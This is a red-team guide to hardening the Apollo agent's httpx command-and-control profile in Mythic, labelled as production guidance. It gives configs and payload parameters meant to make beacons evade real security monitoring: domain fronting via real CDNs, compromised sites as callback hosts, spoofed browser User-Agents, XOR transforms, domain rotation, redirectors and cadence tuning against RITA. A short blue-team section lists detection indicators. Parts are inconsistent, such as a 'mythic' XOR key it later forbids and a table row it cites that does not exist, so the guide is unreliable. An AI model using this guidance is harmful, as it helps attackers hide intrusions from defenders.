# Apollo HTTPX OPSEC Hardening Guide

## Current Configuration Assessment

**Lab/Testing:** ✓ Safe  
**Real Operations:** ✗ NOT Safe - Multiple detectable artifacts

### Detected Indicators

| Indicator | Current Config | Detection Risk | Notes |
|-----------|---------------|----|-------|
| **Port** | 82 (HTTP) | 🔴 Critical | Non-standard, anomalous in network logs |
| **Domain** | cdn.examplestatic.io | 🔴 Critical | Fake/spoofed, obvious to inspection |
| **Protocol** | HTTP unencrypted outer | 🟠 High | Pattern visible in packet capture |
| **Transforms** | Base64 only | 🟠 High | Signature well-known to IDS/EDR |
| **URIs** | Single `/js/lib.min.js` | 🟠 High | Repetitive, abnormal behavior |
| **User-Agent** | Default/missing | 🟠 High | Doesn't match browser behavior |
| **Domain Front** | None | 🟡 Medium | Direct connection to callback IP visible |
| **Jitter** | 37% | 🟢 Low | Reasonable randomization |

## Hardening Options

### Option 1: Lab Setup (Current)
**Files:**
- `httpx_config_fixed.toml` - Basic configuration
- `httpx_minimal.json` - Minimal JSON config

**Use Case:** Training, testing, CTF challenges  
**Risk:** High detection if used against real security monitoring

### Option 2: OPSEC-Hardened (Recommended for ops)
**File:** `httpx_config_hardened.toml`

**Improvements:**
1. ✓ Real browser User-Agent (Chrome 120.0)
2. ✓ Legitimate URI patterns (CDN JS files)
3. ✓ Varied URIs (multiple resources)
4. ✓ Advanced transforms (XOR + Base64url)
5. ✓ Realistic headers (Accept, Cache-Control, ETag)
6. ✓ POST variety (analytics, beacon endpoints)
7. ✓ Realistic server response headers (nginx)

**Remaining Issues (must configure separately):**
- Port 82 → must change to 443 or 80 in payload params
- Domain → must use real domain or domain fronting
- Callback endpoint → needs to be legitimate-looking service

## Deployment Comparison

### Basic Config (Lab Testing)

```toml
# httpx_config_fixed.toml
name = "fin8_cdn"
[get]
uris = ["/js/lib.min.js"]
[get.client]
headers.Host = "cdn.examplestatic.io"
[[get.client.transforms]]
action = "base64"
```

**Payload Parameters:**
```
Callback Domain: http://10.23.20.10:82
Callback Interval: 62s
Callback Jitter: 37%
```

**Risks:**
- Port 82 anomalous
- Domain fake
- Single URI repetitive
- No UA spoofing

---

### Hardened Config (Operations)

```toml
# httpx_config_hardened.toml
name = "fin8_cdn_hardened"
[get]
uris = ["/cdn/jquery.min.js", "/assets/bootstrap.min.js", "/js/app.bundle.js"]
[get.client]
headers.User-Agent = "Mozilla/5.0... Chrome/120.0.0.0..."
[[get.client.transforms]]
action = "xor"
value = "mythic"
[[get.client.transforms]]
action = "base64url"
```

**Payload Parameters:**
```
Callback Domain: https://jsdelivr.net (or domain-front via CDN)
Callback Interval: 45-90s (randomized)
Callback Jitter: 50%
Domain Rotation: fail-over (to backup domains)
```

**Improvements:**
- Port 443 (HTTPS standard)
- Real domain (JSDelivr CDN)
- Multiple URIs (3 variations)
- Realistic User-Agent
- XOR + Base64url (harder to detect)
- Varied POST endpoints
- Realistic headers

---

## OPSEC Hardening Checklist

### Detection priority — fix in THIS order (F7)

A mature blue team almost never catches you on body encoding. Reordering base64/xor moves
**zero** of the analytics in `../detections/elastic-sysmon.md`. Prioritise by what actually
detects a beacon:

1. **Client fingerprint (JA4H / JARM / JA3S)** — highest fidelity. A .NET JA4H under a browser
   User-Agent (N1) is the strongest Mythic tell and is **unfixable at the httpx/managed-agent
   layer** (see the JA4H row in the Detected Indicators table, F8). This dominates everything below.
2. **Timing model** — long, high-jitter, low-volume sleeps starve RITA (N2); short/periodic does
   not. Match the *actor's* cadence, don't invent one (see Behavioral, below).
3. **Infrastructure consistency** — Host/SNI/destination-ASN agreement (N4), real cert on the
   redirector (N6), low URI cardinality (N3). This is where a redirector earns its keep.
4. **Body encoding (xor/base64/base64url)** — lowest fidelity. Do it for correctness, not evasion;
   the key MUST be per-op random (never a framework name — see Traffic-Level, below).

### Network-Level Evasion

- [ ] **Use port 443** instead of 82
  - Command: Payload → httpx_callback_domains: `https://[real-domain]:443`
  
- [ ] **Domain fronting** (if available)
  - Use CDN like Cloudflare, Akamai, or JSDelivr
  - Command: Payload → httpx_domain_front: `real-cdn.com`
  
- [ ] **Use HTTPS** instead of HTTP
  - Requires valid certificate or self-signed (with pinning bypass)
  
- [ ] **Legitimate callback domain**
  - ✓ Real CDN (jsDelivr, unpkg)
  - ✓ Legitimate service (GitHub, AWS S3)
  - ✓ Compromised site (red team's responsibility)
  - ✗ Fake example.com domains

### Traffic-Level Evasion

- [ ] **Multiple URIs** in rotation
  - Already in hardened config
  - Gets randomized per request
  
- [ ] **Transforms** (XOR + Base64url) — *lowest-fidelity control; do not overweight*
  - Already in the ops config
  - Does **not** move periodicity (N2) or fingerprint (N1) detections — see Detection priority
  - **XOR key MUST be per-op random** (`openssl rand -hex 16`). Never `"mythic"` or any framework
    name: a static/known key is a self-identifying IOC recoverable from one known-plaintext block
    (fixed in `c2_profile/generic_cdn_beacon.ops.toml`, F7)
  
- [ ] **Realistic User-Agent**
  - Already in hardened config
  - Chrome 120 matches common browsers
  
- [ ] **Realistic headers**
  - Already in hardened config
  - Accept, Cache-Control, ETag, etc.

### Behavioral Evasion

- [ ] **Actor-specific callback interval** (not a generic 60s/50%)
  - Match the modeled actor: **LockBit ICBC = interval `62` / jitter `37`** (the documented
    value; already in `../profiles/lockbit-icbc.httpx.toml` and `generic_cdn_beacon.ops.toml`, F7)
  - Jitter does **not** defeat RITA (N2) — it perturbs the interval, not the population rhythm.
    The real timing evasion is *long, high-jitter, low-volume* sleep, which forces the SOC to
    lengthen its window. Emulate the actor's real cadence; treat N2 firing as the lesson, not a fail
  
- [ ] **Domain rotation across multiple domains**
  - Command: Payload → httpx_domain_rotation: `round-robin`
  - Requires 2+ domains in callback_domains list
  
- [ ] **Different POST endpoints**
  - Already in hardened config
  - `/api/v1/analytics` and `/beacon/report`

### Encryption & Authentication

- [ ] **EKE (Encrypted Key Exchange)** enabled
  - Command: Payload → httpx_encrypted_exchange_check: `true`
  - ✓ Already configured
  
- [ ] **AES256_HMAC session encryption**
  - Default in Mythic (aes256_hmac)
  - ✓ Already configured

---

## Payload Generation Examples

### Lab Testing (Port 82, example domain)
```
Payload Type: apollo
C2 Profile: httpx
raw_c2_config: httpx_config_fixed.toml
Callback Domain: http://10.23.20.10:82
Callback Interval: 62
Callback Jitter: 37
Encrypted Exchange Check: true
```

**Result:** Works in lab, obvious to network monitoring

---

### OPSEC Operations (Port 443, real domain)
```
Payload Type: apollo
C2 Profile: httpx
raw_c2_config: httpx_config_hardened.toml
Callback Domain: https://jsdelivr.net:443
Callback Interval: 60
Callback Jitter: 50
Domain Rotation: round-robin
Failover Threshold: 5
Encrypted Exchange Check: true
```

**Result:** Blends with legitimate CDN traffic, harder to detect

---

### Redirector Setup (Advanced OPSEC)
```
Callback Domain: https://yourdomain.com:443 (redirector)
Domain Front: cdnjs.cloudflare.com (CDN front)
Callback Interval: 45-90 (randomized)
Callback Jitter: 60%
```

**Architecture:**
```
Apollo Agent
    ↓ (HTTPS to yourdomain.com)
Redirector (Apache mod_rewrite)
    ↓ (Forwards to Mythic)
Mythic Server
    ↓ (Response through redirector)
Apollo Agent
```

---

## Detection Methods (Blue Team Perspective)

### High Confidence Indicators
- [ ] Port 82 HTTP beaconing
- [ ] `cdn.examplestatic.io` DNS resolution
- [ ] Repeated single URI pattern
- [ ] Base64 patterns in HTTP body
- [ ] Missing/default User-Agent

### Medium Confidence Indicators
- [ ] Regular 62-second intervals
- [ ] Specific User-Agent across multiple hosts
- [ ] Consistent POST body size
- [ ] Anomalous Accept headers

### Low Confidence Indicators
- [ ] HTTPS to legitimate CDN
- [ ] Variable User-Agents
- [ ] Randomized intervals
- [ ] Mixed GET/POST requests

---

## Testing & Validation

Before operational deployment, verify:

1. **Profile loads without errors**
   - ✓ Config Check: "Everything matches and looks good!"

2. **Payload builds successfully**
   - ✓ Build command completes

3. **Callback registration works**
   - Agent executes → appears in Mythic UI within interval+jitter

4. **Task execution functions**
   - Queue shell whoami → results return within one checkin cycle

5. **Encryption active**
   - Mythic shows: "Encrypted Exchange Check: true"
   - Network traffic is encrypted (not visible plaintext)

6. **Behavior normal**
   - Beacon intervals follow configured pattern
   - URIs rotate through list
   - Headers look realistic

---

## Files Reference

| File | Purpose | Use Case |
|------|---------|----------|
| `httpx_config_fixed.toml` | Basic working config | Lab/Testing |
| `httpx_minimal.json` | Minimal JSON format | Testing/validation |
| `httpx_config_hardened.toml` | Hardened for operations | Red Team ops |

---

## Recommendations

**For Lab/CTF:** Use `httpx_config_fixed.toml` - focus on functionality

**For Red Team:** Use `httpx_config_hardened.toml` + adjust:
1. Change port 82 → 443
2. Use real domain (jsDelivr, unpkg) or domain front
3. Increase jitter to 50%+
4. Add domain rotation

**For Evasion:** Add redirector layer:
1. Own domain on redirector server
2. Domain front to legitimate CDN
3. Mythic listens on internal network only
4. Redirector forwards traffic through mod_rewrite/Nginx

---

**Status:** Production guidance  
**Last Updated:** 2026-08-25  
**Tested:** Lab environment only
